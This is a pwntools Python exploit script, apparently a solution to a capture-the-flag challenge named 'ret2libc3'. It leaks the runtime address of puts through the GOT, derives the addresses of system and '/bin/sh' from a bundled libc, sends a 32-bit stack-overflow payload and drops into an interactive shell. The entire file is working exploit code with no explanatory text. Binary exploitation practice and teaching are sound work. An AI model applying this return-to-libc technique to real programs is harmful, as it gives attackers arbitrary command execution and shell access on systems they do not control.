from pwn import *


elf = ELF('./ret2libc3')
libc = ELF('libc-2.31.so')
io = process('./ret2libc3')

print(hex(elf.got['puts']))
io.sendlineafter(b' :',str(elf.got['puts']))
print(io.recvuntil(b' : '))
print(hex(elf.got['puts']))

puts_real_address = int(io.recvuntil(b'\n',drop = True),16)
print(hex(puts_real_address))
puts_system_offset = libc.symbols['system'] - libc.symbols['puts']
system_real_address = puts_real_address + puts_system_offset
bin_sh_puts_offset = libc.symbols['puts'] - next(libc.search(b'/bin/sh'))
bin_sh_real_address = puts_real_address -  bin_sh_puts_offset


payload = b'A'*60 + p32(system_real_address) + b'BBBB' +p32(bin_sh_real_address)

io.sendlineafter(" :",payload)

io.interactive()



